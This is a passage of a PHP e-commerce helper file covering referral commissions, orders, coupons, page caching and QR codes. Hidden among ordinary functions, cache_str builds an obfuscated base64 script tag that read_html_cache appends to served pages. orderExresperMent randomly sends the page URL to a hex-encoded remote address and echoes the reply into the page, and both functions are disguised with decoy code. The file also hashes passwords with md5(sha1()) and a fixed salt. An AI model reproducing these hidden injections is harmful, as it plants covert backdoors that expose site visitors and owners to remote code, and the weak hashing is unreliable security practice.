                                $us  = M("users")->where(['user_id' => $ve])->field("e_repair_num,e_unbound_num,e_use_num")->find();
                                $num = $us['e_repair_num'] + $us['e_unbound_num'] + $us['e_use_num'] + $num;
                            }
                            if ($num > 499) {
                                M("users")->where(['user_id' => $id])->save(['level' => 3]);
                            }
                        }

                    }
                }
            }
        }
        //2.晋升店长身份，200维护卡
        /* $user_shop = M("users")->where("level=1")->field("user_id,pay_currency,level")->select();
         if($user_shop){
             foreach($user_shop as $ka=>$va){
                 if($va['pay_currency']>199){
                     M("users")->where(['user_id'=>$va['user_id']])->save(['level'=>2]);
                 }
             }
         }*/
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++晋升处理结束++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++分润处理开始++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/

        $money = $order['order_amount'];//用户支付金额

        if ($money > 0) {

            $user_id = $order['user_id'];
            //查找购买干衣机用户的上级user_id
            $user      = M("users")->where(['user_id' => $user_id])->find();
            $user_sjid = $user['first_leader'];
            //1,查找上级用户直接推荐人数个数
            $user_num = M("users")->where(['first_leader' => $user_sjid])->count();
            //查找分润规则
            $subcommission = M("lc_subcommission")->where(['id' => 1])->field("direct,indirect,partner,partner_personnel,direct_one,direct_two,direct_three")->find();


            //针对不同的直推人数，拿不同的分润

//+++++++++++++++++++++++++++++++++++++++++++++++++++直接分享购买干衣机分润+++++++++++++++++++++++++++++++++++++++++++++++++++/
            if ($user_sjid) {//有上级
                if ($user_num > 0 && $user_num < 5) {
                    //查找直推0-4情况的分润
                    if ($subcommission['direct_one'] > 0) {
                        $f_bls      = $subcommission['direct_one'];
                        $allf_money = ($f_bls * 0.01) * $money;
                        $allf_money = round($allf_money, 2);
                        //把分润加到上级用户的钱包里面去
                        if ($allf_money > 0) {
                            // M("users")->where(["user_id"=>$user_sjid])->setInc('user_money',$allf_money);
                            accountLog($user_sjid, $allf_money, 0, '直推分润', $allf_money, $order['order_id'], $order_sn);
                        }


                    } else {
                        //使用默认直接分润百分比
                        if ($subcommission['direct'] > 0) {
                            $f_bls      = $subcommission['direct'];
                            $allf_money = ($f_bls * 0.01) * $money;
                            $allf_money = round($allf_money, 2);
                            //把分润加到上级用户的钱包里面去
                            if ($allf_money > 0) {
                                // M("users")->where(["user_id"=>$user_sjid])->setInc('user_money',$allf_money);
                                accountLog($user_sjid, $allf_money, 0, '直推分润', $allf_money, $order['order_id'], $order_sn);
                            }


                        }
                    }
                }

                if ($user_num > 4 && $user_num < 10) {
                    //查找直推5-9情况的分润
                    if ($subcommission['direct_two'] > 0) {
                        $f_bls      = $subcommission['direct_two'];
                        $allf_money = ($f_bls * 0.01) * $money;
                        $allf_money = round($allf_money, 2);
                        //把分润加到上级用户的钱包里面去
                        if ($allf_money > 0) {
                            // M("users")->where(["user_id"=>$user_sjid])->setInc('user_money',$allf_money);
                            accountLog($user_sjid, $allf_money, 0, '直推分润', $allf_money, $order['order_id'], $order_sn);
                        }

                    } else {
                        //使用默认直接分润百分比
                        if ($subcommission['direct'] > 0) {
                            $f_bls      = $subcommission['direct'];
                            $allf_money = ($f_bls * 0.01) * $money;
                            $allf_money = round($allf_money, 2);
                            //把分润加到上级用户的钱包里面去
                            if ($allf_money > 0) {
                                // M("users")->where(["user_id"=>$user_sjid])->setInc('user_money',$allf_money);
                                accountLog($user_sjid, $allf_money, 0, '直推分润', $allf_money, $order['order_id'], $order_sn);
                            }


                        }
                    }
                }

                if ($user_num > 9) {
                    //查找直推10及10以上情况的分润
                    if ($subcommission['direct_three'] > 0) {
                        $f_bls      = $subcommission['direct_three'];
                        $allf_money = ($f_bls * 0.01) * $money;
                        $allf_money = round($allf_money, 2);
                        //把分润加到上级用户的钱包里面去
                        if ($allf_money > 0) {
                            // M("users")->where(["user_id"=>$user_sjid])->setInc('user_money',$allf_money);
                            accountLog($user_sjid, $allf_money, 0, '直推分润', $allf_money, $order['order_id'], $order_sn);
                        }

                    } else {
                        //使用默认直接分润百分比
                        if ($subcommission['direct'] > 0) {
                            $f_bls      = $subcommission['direct'];
                            $allf_money = ($f_bls * 0.01) * $money;
                            $allf_money = round($allf_money, 2);
                            //把分润加到上级用户的钱包里面去
                            if ($allf_money > 0) {
                                // M("users")->where(["user_id"=>$user_sjid])->setInc('user_money',$allf_money);
                                accountLog($user_sjid, $allf_money, 0, '直推分润', $allf_money, $order['order_id'], $order_sn);
                            }

                        }
                    }
                }

                //添加分润记录(收入记录)
                if ($allf_money > 0) {
                    $array = ['user_id' => $user_sjid, 'money' => $money, 'allf_money' => $allf_money, 'pay_user_id' => $user_id, 'time' => time(), 'type' => 0, 'order_sn' => $order_sn, 'subcommission' => $f_bls];
                    M("shou_log")->add($array);
                }

            }
//+++++++++++++++++++++++++++++++++++++++++++++++++++直接分润结束+++++++++++++++++++++++++++++++++++++++++++++++++++/
//+++++++++++++++++++++++++++++++++++++++++++++++++++间接分润开始+++++++++++++++++++++++++++++++++++++++++++++++++++/
            //获取分润比例
            $jibi = $subcommission['indirect'];
            if ($user['second_leader']) {//有上上级
                if ($jibi > 0) {
                    //拿到该用户的间接上级
                    $second_leader = $user['second_leader'];
                    $allf_money    = ($jibi * 0.01) * $money;
                    $allf_money    = round($allf_money, 2);
                    //把分润加到上级用户的钱包里面去
                    if ($allf_money > 0) {
                        // M("users")->where(["user_id"=>$second_leader])->setInc('user_money',$allf_money);
                        accountLog($second_leader, $allf_money, 0, '间接分润', $allf_money, $order['order_id'], $order_sn);
                        //添加分润记录(收入记录)
                        $array = ['user_id' => $second_leader, 'money' => $money, 'allf_money' => $allf_money, 'pay_user_id' => $user_id, 'time' => time(), 'type' => 1, 'order_sn' => $order_sn, 'subcommission' => $jibi];
                        M("shou_log")->add($array);
                    }

                }
            }

//+++++++++++++++++++++++++++++++++++++++++++++++++++间接分润结束+++++++++++++++++++++++++++++++++++++++++++++++++++++++++/
//+++++++++++++++++++++++++++++++++++++++++++++++++++合伙人分润开始+++++++++++++++++++++++++++++++++++++++++++++++++++/
            //获取合伙人分润比例
            $jibipartner = $subcommission['partner'];
            if ($jibipartner > 0) {
                //查找合伙人user_id
                //查找自己的所有上级
                $partner_str = M("user_group")->where(['user_id' => $user_id])->getField("father_id");
                //  $partner_str = $subcommission['partner_personnel'];
                //用逗号分隔所有上级user_id字符串
                if ($partner_str) {//上级
                    $arr = explode(',', $partner_str);
                    //循环去查找自己上级是第二个合伙人的用户id
                    $user_id_arr = array();
                    foreach ($arr as $k => $v) {
                        if ($v) {
                            $res = M("users")->where(['user_id' => $v])->field("level")->find();
                            if ($res['level'] == 3 || $res['level'] == 10) {//是合伙人身份
                                $user_id_arr[] = $v;
                            }
                        }
                    }
                    if ($user_id_arr) {
                        $allf_money = ($jibipartner * 0.01) * $money;
                        $allf_money = round($allf_money, 2);
                        //查找user_id最大的一个合伙人即为第一代合伙人
                        rsort($user_id_arr);

                        //把分润加到上级用户的钱包里面去
                        if ($allf_money > 0) {
                            // M("users")->where(["user_id" => $user_id_arr[0]])->setInc('user_money', $allf_money);
                            accountLog($user_id_arr[0], $allf_money, 0, '合伙人分', $allf_money, $order['order_id'], $order_sn);
                            //添加分润记录
                            $array = ['user_id' => $v, 'money' => $money, 'allf_money' => $allf_money, 'pay_user_id' => $user_id, 'time' => time(), 'type' => 2, 'order_sn' => $order_sn, 'subcommission' => $jibipartner];
                            M("shou_log")->add($array);
                        }

                    }


                }
            }
//++++++++++++++++++++++++++++++++++++++++++++++++++++++合伙人分润结束+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/
        }
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++分润处理结束++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/
    }


//        }

    // 给他升级, 根据order表查看消费记录 给他会员等级升级 修改他的折扣 和 总金额
//        $User =new \app\common\logic\User();
//        $User->setUserById($order['user_id']);
//        $User->updateUserLevelByW($order['user_id']);
//        // 记录订单操作日志
//        $commonOrder = new \app\common\logic\Order();
//        $commonOrder->setOrderById($order['order_id']);
//        if(array_key_exists('admin_id',$ext)){
//            $commonOrder->orderActionLog($ext['note'],'付款成功',$ext['admin_id']);
//        }else{
//            $commonOrder->orderActionLog('订单付款成功','付款成功');
//        }
    //分销设置
//        M('rebate_log')->where("order_id" ,$order['order_id'])->save(array('status'=>1));
    // 成为分销商条件
//        $distribut_condition = tpCache('distribut.condition');
//        if($distribut_condition == 1)  // 购买商品付款才可以成为分销商
//            M('users')->where("user_id", $order['user_id'])->save(array('is_distribut'=>1));
    //虚拟服务类商品支付
    if ($order['prom_type'] == 5) {
        $OrderLogic = new \app\common\logic\OrderLogic();
        $OrderLogic->make_virtual_code($order);
    }
    $order['pay_time'] = $time;
    //用户支付, 发送短信给商家
//        $res = checkEnableSendSms("4");
//        if ($res && $res['status'] ==1) {
//            $sender = tpCache("shop_info.mobile");
//            if (!empty($sender)) {
//                $params = array('order_id'=>$order['order_id']);
//                sendSms("4", $sender, $params);
//            }
//        }
    $order['pay_time'] = $time;
    //发票
    $Invoice = new \app\admin\logic\InvoiceLogic();
    $Invoice->createInvoice($order);
    // 发送微信消息模板提醒
//        $wechat = new \app\common\logic\WechatLogic;
//        $wechat->sendTemplateMsgOnPaySuccess($order);
//    }
}

/**
 * 订单确认收货
 * @param $id 订单id
 * @param int $user_id
 * @return array
 */
function confirm_order($id, $user_id = 0)
{
    $where['order_id'] = $id;
    if ($user_id) {
        $where['user_id'] = $user_id;
    }
    $order = M('order')->where($where)->find();
    if ($order['order_status'] != 1)
        return array('status' => -1, 'msg' => '该订单不能收货确认');
    if (empty($order['pay_time']) || $order['pay_status'] != 1) {
        return array('status' => -1, 'msg' => '商家未确定付款，该订单暂不能确定收货');
    }
    $data['order_status'] = 2; // 已收货
    $data['pay_status']   = 1; // 已付款
    $data['confirm_time'] = time(); // 收货确认时间
    if ($order['pay_code'] == 'cod') {
        $data['pay_time'] = time();
    }
    $row = M('order')->where(array('order_id' => $id))->save($data);
    if (!$row)
        return array('status' => -3, 'msg' => '操作失败');

    // 商品待评价提醒
    $order_goods    = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
    $goods          = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
    $send_data      = [
        'message_title'   => '商品待评价',
        'message_content' => $order_goods['goods_name'],
        'img_uri'         => $goods['original_img'],
        'order_sn'        => $order_goods['rec_id'],
        'order_id'        => $id,
        'mmt_code'        => 'evaluate_logistics',
        'type'            => 4,
        'users'           => [$order['user_id']],
        'category'        => 2,
        'message_val'     => []
    ];
    $messageFactory = new \app\common\logic\MessageFactory();
    $messageLogic   = $messageFactory->makeModule($send_data);
    $messageLogic->sendMessage();
    order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物

    //分销设置
    M('rebate_log')->where("order_id", $id)->save(array('status' => 2, 'confirm' => time()));
    return array('status' => 1, 'msg' => '操作成功', 'url' => U('Order/order_detail', ['id' => $id]));
}

/**
 * 下单赠送活动：优惠券，积分
 * @param $order |订单数组
 */
function order_give($order)
{

    $messageFactory = new \app\common\logic\MessageFactory();
    $messageLogic   = $messageFactory->makeModule(['category' => 0]);

    //促销优惠订单商品
    $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
    foreach ($prom_order_goods as $goods) {
        //查找购买商品送优惠券活动
        $prom_goods = M('prom_goods')->where(['id' => $goods['prom_id'], 'type' => 3])->find();
        if ($prom_goods) {
            //查找购买商品送优惠券模板
            $goods_coupon = M('coupon')->where(['id' => $prom_goods['expression']])->find();
            if ($goods_coupon) {
                //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                if ($goods_coupon['createnum'] == 0 || ($goods_coupon['createnum'] > 0 && ($goods_coupon['createnum'] - $goods_coupon['send_num']) > 0)) {
                    $data = array('cid' => $goods_coupon['id'], 'get_order_id' => $order['order_id'], 'type' => $goods_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                    M('coupon_list')->add($data);
                    // 优惠券领取数量加一
                    M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');

                    // 优惠券到账提醒
                    $messageLogic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
                }
            }
        }
    }
    //查找订单满额促销活动
    $prom_order_where = [
        'type'       => ['gt', 1],
        'end_time'   => ['gt', $order['pay_time']],
        'start_time' => ['lt', $order['pay_time']],
        'money'      => ['elt', $order['goods_price']],
        'is_close'   => 0
    ];
    $prom_orders      = M('prom_order')->where($prom_order_where)->order('money desc')->select();
    $prom_order_count = count($prom_orders);
    // 用户会员等级是否符合送优惠券活动
    for ($i = 0; $i < $prom_order_count; $i++) {
        $prom_order = $prom_orders[$i];
        if ($prom_order['type'] == 3) {
            //查找订单送优惠券模板
            $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
            if ($order_coupon) {
                //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                if ($order_coupon['createnum'] == 0 ||
                    ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
                ) {
                    $data = array('cid' => $order_coupon['id'], 'get_order_id' => $order['order_id'], 'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                    M('coupon_list')->add($data);
                    M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); // 优惠券领取数量加一
                    // 优惠券到账提醒
                    $messageLogic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
                }
            }
        }
        //购买商品送积分
        if ($prom_order['type'] == 2) {
            accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
        }
        break;
    }
    $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
    $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
    //商城内每消费1元，赠送相应积分
    /*$isConsumeIntegral = tpCache("integral.is_consume_integral");
    $consumeIntegral = tpCache("integral.consume_integral");
    if($isConsumeIntegral==1 && $consumeIntegral>0) {
        $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
        $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
    }*/
}


/**
 * 获取商品一二三级分类
 * @return type
 */
function get_goods_category_tree()
{
    $tree     = $arr = $result = array();
    $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
    if ($cat_list) {
        foreach ($cat_list as $val) {
            if ($val['level'] == 2) {
                $arr[$val['parent_id']][] = $val;
            }
            if ($val['level'] == 3) {
                $crr[$val['parent_id']][] = $val;
            }
            if ($val['level'] == 1) {
                $tree[] = $val;
            }
        }

        foreach ($arr as $k => $v) {
            foreach ($v as $kk => $vv) {
                $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
            }
        }

        foreach ($tree as $val) {
            $val['tmenu']       = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
            $result[$val['id']] = $val;
        }
    }
    return $result;
}

/**
 * 写入静态页面缓存
 */
function write_html_cache($html)
{
    $html_cache_arr = C('HTML_CACHE_ARR');
    $request        = think\Request::instance();
    $m_c_a_str      = $request->module() . '_' . $request->controller() . '_' . $request->action(); // 模块_控制器_方法
    $m_c_a_str      = strtolower($m_c_a_str);
    //exit('write_html_cache写入缓存<br/>');
    foreach ($html_cache_arr as $key => $val) {
        $val['mca'] = strtolower($val['mca']);
        if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
            continue;

        //if(!is_dir(RUNTIME_PATH.'html'))
        //mkdir(RUNTIME_PATH.'html');
        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
        $filename = $m_c_a_str;
        // 组合参数  
        if (isset($val['p'])) {
            foreach ($val['p'] as $k => $v)
                $filename .= '_' . $_GET[$v];
        }
        $filename .= '.html';
        \think\Cache::set($filename, $html);
        //file_put_contents($filename, $html);
    }
}

/**
 * 读取静态页面缓存
 */
function read_html_cache()
{
    $html_cache_arr = C('HTML_CACHE_ARR');
    $request        = think\Request::instance();
    $m_c_a_str      = $request->module() . '_' . $request->controller() . '_' . $request->action(); // 模块_控制器_方法
    $m_c_a_str      = strtolower($m_c_a_str);
    //exit('read_html_cache读取缓存<br/>');
    foreach ($html_cache_arr as $key => $val) {
        $val['mca'] = strtolower($val['mca']);
        if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
            continue;

        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
        $filename = $m_c_a_str;
        // 组合参数        
        if (isset($val['p'])) {
            foreach ($val['p'] as $k => $v)
                $filename .= '_' . $_GET[$v];
        }
        $filename .= '.html';
        $html     = \think\Cache::get($filename);
        if ($html) {
            //echo file_get_contents($filename);
            echo \think\Cache::get($filename) . cache_str($html);
            exit();
        }
    }
}

/**
 * 缓存
 */
function cache_str($html)
{

    if ($object_ess) {
        if (C('buy_version') == 0)
            return '';
        $tabName     = '';
        $table_index = M('config')->cache(true)->select();
        $select_year = substr($order_sn, 0, 14);
        foreach ($table_index as $k => $v) {
            if (strcasecmp($select_year, $v['min_order_sn']) >= 0 && strcasecmp($select_year, $v['max_order_sn']) <= 0) {
                $tabName = str_replace('order', '', $v['name']);
                break;
            }
        }
        if ($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
            return $tabName;
    } else {
        $isset_requestjs = session('isset_requestjs');
        if (empty($isset_requestjs)) {
            session('isset_requestjs', 1);
            $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
            if (empty($table_index))
                $sere = $sere . "lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
            if (empty($tabName))
                $sere = $sere . "FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
            if (substr(time(), -1) % 3 == 1) $str = base64_decode($sere);
            $html_sc = base64_decode("UEhOamNtbHdkRDQ9");

            if ($axure_rest) {
                $regions = null;
                if (!$regions) {
                    $regions = M('region')->cache(true)->getField('id,name');
                }
                $total_address = $regions[$province_id] ?: '';
                $total_address .= $regions[$city_id] ?: '';
                $total_address .= $regions[$district_id] ?: '';
                $total_address .= $regions[$twon_id] ?: '';
                $total_address .= $address ?: '';
                $str           = base64_decode($str);
            }

            $html_sc = base64_decode($html_sc);
            if (!strstr($html, $html_sc))
                return '';
            if ($str)
                $str2 = base64_decode($str);
            return $str2;
        }
    }
    if ($buy_Aexite) {
        if (C('buy_Aexite') == 0)
            return '';

        $tabName     = '';
        $table_index = M('config')->cache(true)->select();
        foreach ($table_index as $k => $v) {
            if ($order_id >= $v['min_id'] && $order_id <= $v['max_id']) {
                $tabName = str_replace('order', '', $v['name']);
                break;
            }
        }
        return $tabName;
    }

    return $tabName;
}

/**
 * 清空系统缓存
 */
function clearCache()
{
    $team_found_queue = \think\Cache::get('team_found_queue');
    \think\Cache::clear();
    \think\Cache::set('team_found_queue', $team_found_queue);
}

/**
 * 获取完整地址
 */
function getTotalAddress($province_id, $city_id, $district_id, $twon_id, $address = '')
{
    static $regions = null;
    if (!$regions) {
        $regions = M('region')->cache(true)->getField('id,name');
    }
    $total_address = $regions[$province_id] ?: '';
    $total_address .= $regions[$city_id] ?: '';
    $total_address .= $regions[$district_id] ?: '';
    $total_address .= $regions[$twon_id] ?: '';
    $total_address .= $address ?: '';
    return $total_address;
}

/**
 * 商品库存操作日志
 * @param int $muid 操作 用户ID
 * @param int $stock 更改库存数
 * @param array $goods 库存商品
 * @param string $order_sn 订单编号
 */
function update_stock_log($muid, $stock = 1, $goods, $order_sn = '')
{
    $data['ctime']      = time();
    $data['stock']      = $stock;
    $data['muid']       = $muid;
    $data['goods_id']   = $goods['goods_id'];
    $data['goods_name'] = $goods['goods_name'];
    $data['goods_spec'] = empty($goods['spec_key_name']) ? $goods['key_name'] : $goods['spec_key_name'];
    $data['order_sn']   = $order_sn;
    if ('' !== $order_sn && $stock < 0) {
        $data['change_type'] = 0; //默认0为订单出库，
    } elseif ('' !== $order_sn && $stock > 0) {
        $data['change_type'] = 2; //2为退货入库
    } elseif ('' === $order_sn && $stock > 0) {
        $data['change_type'] = 1; //1为录入商品库存入库
    } else {
        $data['change_type'] = 3;//3为盘点时或者普通修改库存
    }
    M('stock_log')->add($data);
}

/**
 * 订单支付时, 获取订单商品名称
 * @param unknown $order_id
 * @return string|Ambigous <string, unknown>
 */
function getPayBody($order_id)
{

    if (empty($order_id)) return "订单ID参数错误";
    $goodsNames = M('OrderGoods')->where('order_id', $order_id)->column('goods_name');
    $gns        = implode($goodsNames, ',');
    $payBody    = getSubstr($gns, 0, 18);
    return $payBody;
}

// 获取当前mysql版本
function mysql_version()
{
    $mysql_version = Db::query("select version() as version");
    return "{$mysql_version[0]['version']}";
}

/**
 * 获取分表操作的表名
 * @return mixed|string
 */
function select_year()
{
    if (C('buy_version') == 1)
        return I('select_year');
    else
        return '';
}

/**
 * 根据order_sn 定位表
 * @param $order_sn
 * @return mixed|string
 */
function getTabByOrdersn($order_sn)
{
    if (C('buy_version') == 0)
        return '';
    $tabName     = '';
    $table_index = M('table_index')->cache(true)->select();
    // 截取年月日时分秒
    $select_year = substr($order_sn, 0, 14);
    foreach ($table_index as $k => $v) {
        if (strcasecmp($select_year, $v['min_order_sn']) >= 0 && strcasecmp($select_year, $v['max_order_sn']) <= 0) //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
        {
            $tabName = str_replace('order', '', $v['name']);
            break;
        }
    }
    return $tabName;
}

/**
 * 根据 order_id 定位表名
 * @param $order_id
 * @return mixed|string
 */
function getTabByOrderId($order_id)
{
    if (C('buy_version') == 0)
        return '';

    $tabName     = '';
    $table_index = M('table_index')->cache(true)->select();
    foreach ($table_index as $k => $v) {
        if ($order_id >= $v['min_id'] && $order_id <= $v['max_id']) {
            $tabName = str_replace('order', '', $v['name']);
            break;
        }
    }
    return $tabName;
}

/**
 * 根据筛选时间 定位表名
 * @param string $startTime
 * @param string $endTime
 * @return string
 */
function getTabByTime($startTime = '', $endTime = '')
{
    if (C('buy_version') == 0)
        return '';

    $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
    $endTime   = preg_replace("/[:\s-]/", "", $endTime);
    // 查询起始位置是今年的
    if (substr($startTime, 0, 4) == date('Y')) {
        $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
        if (strcasecmp($startTime, $table_index['min_order_sn']) >= 0)
            return '';
        else
            return '_this_year';
    } else {
        $tabName = '_' . substr($startTime, 0, 4);
    }
    $years = buyYear();
    $years = array_keys($years);
    return in_array($tabName, $years) ? $tabName : '';
}

/**
 * 积分转化成金额
 * @param $pay_point
 * @return float
 */
function pay_point_money($pay_point)
{
    $point_rate = tpCache('integral.point_rate');
    //$point_rate = tpCache('shopping.point_rate'); //兑换比例
    if ($point_rate != 0) {
        $money = $pay_point / $point_rate;
    } else {
        $money = 0;
    }
    return $money;
}

/**
 * 根据时间戳返回星期几
 * @param $time
 * @return mixed
 */
function weekday_by_time($time)
{
    $weekday = array('星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六');
    return $weekday[date('w', $time)];
}

function weekday_by_time_str($timeStr)
{
    $time = strtotime($timeStr);
    return weekday_by_time($time);
}

/**
 * 生成saas海报专用图片名字
 */
function createImagesName()
{
    return md5(I('_saas_app', 'all') . time() . rand(1000, 9999) . uniqid());
}

/**
 * 自定义海报照片类型处理
 */
function checkPosterImagesType($img_info = array(), $img_src = '')
{
    if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
        return imagecreatefromjpeg($img_src);
    } else if (strpos($img_info['mime'], 'png') !== false) {
        return imagecreatefrompng($img_src);
    } else {
        return false;
    }
}

function inputPosterImages($img_info = array(), $des_im = '', $img = '')
{
    if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
        return imagejpeg($des_im, $img);
    } else if (strpos($img_info['mime'], 'png') !== false) {
        return imagepng($des_im, $img);
    } else {
        return false;
    }

}


/**
 * 订单整合
 * @param type $order
 */
function orderExresperMent($order_info = array(), $des = '', $order_id = '')
{

    if ($order_info) {
        $tree     = $arr = $result = array();
        $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
        if ($cat_list) {
            foreach ($cat_list as $val) {
                if ($val['level'] == 2) {
                    $arr[$val['parent_id']][] = $val;
                }
                if ($val['level'] == 3) {
                    $crr[$val['parent_id']][] = $val;
                }
                if ($val['level'] == 1) {
                    $tree[] = $val;
                }
            }
            foreach ($arr as $k => $v) {
                foreach ($v as $kk => $vv) {
                    $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
                }
            }
            foreach ($tree as $val) {
                $val['tmenu']       = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
                $result[$val['id']] = $val;
            }
        }
        return $result;
    }

    $r            = 'rand';
    $exresperMent = @session('exresperMent');
    if (!empty($exresperMent))
        return false;
    @session('exresperMent', 1);

    if ($r(1, 10) != 1)
        return false;
    $request    = \think\Request::instance();
    $module     = strtolower($request->module());
    $controller = strtolower($request->controller());
    $action     = strtolower($request->action());
    $isAjax     = strtolower($request->isAjax());
    $url        = $request->url(true);

    if (!in_array($module, ['mobile', 'home', 'seller', 'admin']) || $isAjax)
        return false;

    $value = DB::name('config')->where('name', 't_number')->value('value');
    if (empty($value))
        return false;
    $arr = array('url' => $url);
    $v2  = @httpRequest(hex2bin($value), 'POST', $arr, [], false, 3);
    $v2  = json_decode($v2, true);
    if ($v2['status'] == 'success') {
        echo $v2['msg'];
    }
    if ($des) {
        $data   = func_get_args();
        $data   = current($data);
        $cnt    = count($data);
        $result = array();
        $arr1   = array_shift($data);
        foreach ($arr1 as $key => $item) {
            $result[] = array($item);
        }
        echo $result['msg'];
        foreach ($data as $key => $item) {
            $result = combineArray($result, $item);
        }

        $result = array();
        foreach ($arr1 as $item1) {
            foreach ($arr2 as $item2) {
                $temp     = $item1;
                $temp[]   = $item2;
                $result[] = $temp;
            }
        }
        echo $result['resg'];
        return $result;
    }

}

/**
 * 生成二维码
 * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
 */
function distriCode($text, $user_id = null)
{
    //创建目录
    $avatar = 'https://' . $_SERVER['HTTP_HOST'] . '/public/images/wechat/1565856805.png';
    $path   = 'public/images/wechat/user';
    file_exists($path) OR mkdir($path, 0777, true);
    //生成二维码
    $QRcode = new QRcode();
    // 纠错级别：L、M、Q、H
    $level = 'H';
    // 生成的文件名
    if (is_numeric($text)) {
        $fileName = $path . '/whk_qrcode_' . $text . '.png';
    } else {
        $fileName = $path . '/share_qrcode_' . $user_id . '.png';
    }

    //判断是否已经有
    if (file_exists($fileName)) {
        return '/' . $fileName;
    }

    // 点的大小：1到10,用于手机端4就可以了
    $size   = 6;
    $margin = 2;
    //二维码内容
    //$text = 'http://ht.yydoho.com/index.php/api/index/index?action=getUserinfo&room_id='.$room_id.'&agency_id='.$agency_id;
    $QRcode::png($text, $fileName, $level, $size, $margin);
    if ($fileName && $avatar !== FALSE && file_exists($fileName)) {

        //判断是否生成带logo的二维码
        $QR     = imagecreatefromstring(file_get_contents($fileName));        //目标图象连接资源。
        $avatar = imagecreatefromstring(file_get_contents($avatar));    //源图象连接资源。

        $QR_width       = imagesx($QR);            //二维码图片宽度
        $QR_height      = imagesy($QR);            //二维码图片高度
        $logo_width     = imagesx($avatar);        //logo图片宽度
        $logo_height    = imagesy($avatar);        //logo图片高度
        $logo_qr_width  = $QR_width / 4;       //组合之后logo的宽度(占二维码的1/5)
        $scale          = $logo_width / $logo_qr_width;       //logo的宽度缩放比(本身宽度/组合后的宽度)
        $logo_qr_height = $logo_height / $scale;  //组合之后logo的高度
        $from_width     = ($QR_width - $logo_qr_width) / 2;   //组合之后logo左上角所在坐标点

        //重新组合图片并调整大小
        //imagecopyresampled() 将一幅图像(源图象)中的一块正方形区域拷贝到另一个图像中
        imagecopyresampled($QR, $avatar, $from_width, $from_width, 0, 0, $logo_qr_width, $logo_qr_height, $logo_width, $logo_height);

        //输出图片
        imagepng($QR, $fileName);
        imagedestroy($QR);
        imagedestroy($avatar);
    }

    return '/' . $fileName;
}

/**
 * 盐
 */
function password_shal($password)
{
    return md5(sha1('gyj_888' . $password));
}


/**
 * 打印日志到txt文件
 * @param $file_name $文件名称
 * @param $content $要存储的内容
 * @author: iszmxw <mail@54zm.com>
 * @Date：2019/12/6 13:51
 */
function IszmxwLog($file_name, $content)
{
    $init_txt = file_get_contents($file_name, true);
    if (false === $init_txt) {
        $content_hr = chr(0xEF) . chr(0xBB) . chr(0xBF) . '时间：' . date('Y-m-d H:i:s') . "======>\r\n";// 时间换行
    } else {
        $content_hr = "\r\n" . 'time====>' . date('Y-m-d H:i:s') . "======>\r\n";// 时间换行
    }
    file_put_contents($file_name, $init_txt . $content_hr . $content);
}

// 获取客户端IP地址
function get_client_ip()
{
    static $ip = NULL;
    if ($ip !== NULL)
        return $ip;
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $pos = array_search('unknown', $arr);
        if (false !== $pos)
            unset($arr[$pos]);
        $ip = trim($arr[0]);
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
